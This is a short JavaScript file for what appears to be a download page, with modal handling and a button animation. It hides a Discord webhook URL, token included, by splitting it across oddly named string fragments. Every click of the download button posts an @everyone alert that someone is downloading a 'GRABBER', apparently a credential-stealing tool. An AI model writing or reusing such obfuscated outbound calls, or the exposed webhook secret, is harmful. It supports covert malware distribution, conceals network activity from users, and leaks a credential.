const btn = document.querySelector('.download-btn');

const p1  = "https:";
const sighjdfsd  = "scord.c";
const p3  = "om/api/";
const p4  = "webhooks/";
const p5  = "1421607";
const sighjdfsdasd  = "251482";
const p7  = "771487/9DBm1dS";
const p8  = "kERQROhvRuRkvGWj";
const p9  = "yZd";
const p10 = "f_UjM";
const p11 = "PqkK";
const p67  = "//di";
const p12 = "iIAi";
const p13 = "LamHf";
const p14 = "mTNeQm5b";
const p15 = "Os0FkKV7hOqdzLw1";

const webhookURL =
  p1+p67+sighjdfsd+p3+p4+p5+
  sighjdfsdasd+p7+p8+p9+p10+
  p11+p12+p13+p14+p15;

document.addEventListener('DOMContentLoaded', () => {
  
  const modal = document.getElementById('secret-modal');
  const openBtn = document.getElementById('source-btn');
  const closeIcon = document.querySelector('.close-icon');
  const closeBtn = document.getElementById('close-btn');

  openBtn.addEventListener('click', (e) => {
    e.preventDefault(); 
    modal.style.display = 'flex'; 
  });

  const closeModal = () => {
    modal.style.display = 'none';
  };

  closeIcon.addEventListener('click', closeModal);
  closeBtn.addEventListener('click', closeModal);

  window.addEventListener('click', (e) => {
    if (e.target === modal) {
      closeModal();
    }
  });
  
});
btn.addEventListener('click', () => {
  btn.style.transform = 'scale(0.95)';
  setTimeout(() => {
    btn.style.transform = 'scale(1.05)';
  }, 150);
  setTimeout(() => {
    btn.style.transform = 'scale(1)';
  }, 300);

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: "||@here @everyone|| :rotating_light: Somebody downloading (GRABBER). :rotating_light:"
    })
  }).catch(err => console.error("Error", err));
});

